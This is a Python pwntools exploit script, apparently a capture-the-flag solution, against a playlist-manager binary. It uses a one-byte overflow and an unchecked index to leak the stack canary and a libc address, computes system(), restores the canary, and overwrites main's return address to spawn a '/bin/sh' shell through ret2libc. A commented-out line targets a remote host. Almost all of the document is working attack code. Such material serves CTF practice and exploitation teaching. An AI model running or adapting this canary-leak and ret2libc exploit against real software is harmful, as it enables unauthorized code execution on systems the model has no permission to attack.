#!/usr/bin/env python
"""

	uaf.io

1. Send string '/bin/sh' as name
2. Use 1 byte overflow to overwrite the null byte of the canary.
3. Use modify playlist with unchecked index to overflow the stack past the RET
4. Use view playlist to leak the canary and the address of libc_start_main
5. Calculate system from libc_start_main
6. Restore the value of the canary
7. Use modify playlist to modify the saved RET of main with system and '/bin/sh' argument
8. Exit to cause ret2libc

"""
from pwn import *
import sys, struct, time, re

#r = remote('175.119.158.133', 9091)
r = process(['./5d63b69dccbd0d46bcf3e559bf79b4a7'])
#print util.proc.pidof(r)
#sys.stdin.read(1)

# Send username
garbage = r.recvline()
r.sendline("/bin/sh\x00")
garbage = r.recv()

# Make 100 playlists to overwrite the nullbyte of the canary
for i in range(100):
	r.sendline('1')
#	time.sleep(.1)
	garbage = r.recv(timeout=.2)
	r.send("A" * 21)
	garbage = r.recv(timeout=.2)
	r.send("B" * 21)
	garbage = r.recv(timeout=.2)

# Print the playlists twice to leak the canary
r.sendline('2')
buf = ""
garbage = 1
while garbage:
	garbage = r.recv(timeout=.2)
	buf += garbage
# Redoing because of buffering issues
r.sendline('2')
garbage = 1
while garbage:
	time.sleep(.1)
	garbage = r.recv(timeout=.2)
	buf += garbage

# Calculate the canary
canary = buf.split('100')[1][42:46][::-1]
canary = int(canary.encode('hex'), 16) & 0xFFFFFF00
log.info("Canary: " + hex(canary))

# Collect output
garbage = 1
while garbage:
	garbage = r.recv(timeout=.2)

# Overwrite past the saved RET to leak the libc_start_main+9
r.sendline('3')
r.sendline('101')
# Collect output
garbage = 1
while garbage:
	garbage = r.recv(timeout=.2)
payload = "C" * 20
r.send(payload)
r.send("C" * 80 + "ZZZZ")
garbage = r.recv()

# Leak the address libc_start_main+9
r.sendline('2')
buf = ""
garbage = 1
while garbage:
#	time.sleep(.1)
	garbage = r.recv(timeout=.2)
	buf += garbage
# Twice couz of buffering issues
r.sendline('2')
garbage = 1
while garbage:
#	time.sleep(.1)
	garbage = r.recv(timeout=.2)
	buf += garbage

libc_start_main = int(buf.split('ZZZZ')[1][:4][::-1].encode('hex'), 16)
libc_start_main -= 9
system = libc_start_main + 157696 # for remote use value 142112

log.info("libc_start_main: " + hex(libc_start_main))
log.info("System: " + hex(system))

# Restore the canary
r.sendline('3')
r.sendline('100')
r.send('\x00' * 41)

# Collect output
garbage = 1
while garbage:
	garbage = r.recv(timeout=.2)

# Overwrite the return from main with system()
r.sendline('3')
r.sendline('101')
payload  = "D" * 4
payload += "D" * 4
payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", system)
payload += struct.pack("<I", 0)
payload += struct.pack("<I", 0x804d7a0)
r.send(payload)
payload = "C" * (200 - len(payload))
r.sendline(payload)

# Collect output
garbage = 1
while garbage:
	garbage = r.recv(timeout=.3)

# Cause a return
r.sendline('4')

r.interactive()